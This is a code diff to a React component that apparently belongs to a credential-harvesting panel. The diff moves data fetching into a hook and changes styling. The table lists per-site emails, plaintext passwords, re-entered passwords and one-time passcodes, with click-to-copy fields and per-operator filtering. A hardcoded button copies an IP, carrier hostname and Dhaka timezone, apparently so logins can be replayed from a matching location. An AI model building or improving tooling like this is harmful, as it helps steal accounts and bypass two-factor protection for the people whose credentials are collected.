@@ -1,42 +1,14 @@
-import { useContext, useEffect, useState } from "react";
-import { getData } from "../../api/fetching";
+
 import { formatUtcToLocal } from "../../utils/DateFormater";
-import { AuthContext } from "../../Contexts/AuthProvider";
 import { handleCopyClick } from "../../utils/copyToClipboard";
 import Loader from "../../common/Loader";
+import useInformation from "../../hooks/useInformation";
+
 
 
 const InformationTable = () => {
-  const { role, user } = useContext(AuthContext)
-  const [loading, setLoading] = useState(false)
-  const [info, setInfo] = useState<[]>([])
-  const [isRefresh, setIsRefresh] = useState(0)
-
-  console.log(info);
-
-  let url: string;
-  useEffect(() => {
-    const fetchData = async () => {
-      setLoading(true)
-      try {
-
-        if (role === 'admin') {
-          url = `information`
-        } else {
-          url = `information?id=${user?.id}`
-        }
-        const data = await getData(url);
-        setInfo((data as any)?.data);
-        setLoading(false)
-      } catch (error) {
-        console.error('Error fetching data:', error);
-        setLoading(false)
-      }
-    };
-
-    fetchData();
-  }, [user, isRefresh]);
-
+  const {loading,setIsRefresh,info,role} = useInformation()
+ 
 
   return (
     <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
@@ -44,7 +16,7 @@ const InformationTable = () => {
         <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
           All User Informations
         </h4>
-       
+
         <button
           onClick={() => setIsRefresh(Math.random())}
           className="inline-flex rounded items-center justify-center bg-primary py-3 px-5 text-center font-medium text-white hover:bg-opacity-90 lg:px-5 xl:px-10">Refresh</button>
@@ -118,29 +90,28 @@ const InformationTable = () => {
                     )
                   }
                   <td onClick={() => handleCopyClick(siteName)} className="px-2 py-1 font-bold cursor-pointer  ">
-                    <span className={`text-bodydark1 rounded-md p-1 font-bold ${
-            index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-          }`}>{siteName}</span>
+                    <span className={`text-bodydark1 rounded-md p-1 font-bold ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                      }`}>{siteName}</span>
 
                   </td>
                   <td onClick={() => handleCopyClick(email)} className="px-2 py-1 font-bold cursor-pointer">
 
-  <input type="text" className="p-2 bg-graydark " value={email} />
-</td>
+                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={email} />
+                  </td>
                   <td onClick={() => handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">
 
-                  <input type="text" className="p-2 bg-graydark" value={password} />
-                 
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={password} />
+
                   </td>
                   <td onClick={() => handleCopyClick(repassword)} className="px-2 py-1 font-bold cursor-pointer ">
 
-                  <input type="text" className="p-2 bg-graydark" value={repassword} />
-                   
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={repassword} />
+
                   </td>
                   <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
-                    <input type="text" className="p-2 bg-graydark" value={otp} />
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />
 
-                    
+
                   </td>
 
 
@@ -148,9 +119,8 @@ const InformationTable = () => {
                     <div className="relative inline-block">
                       <button
                         onClick={() => handleCopyClick('103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka')}
-                        className={`p-2 ${
-                          index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                        }`}>Copy</button>
+                        className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                          }`}>Copy</button>
                       <div className="tooltip" > 103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka</div>
                     </div>
                   </td>
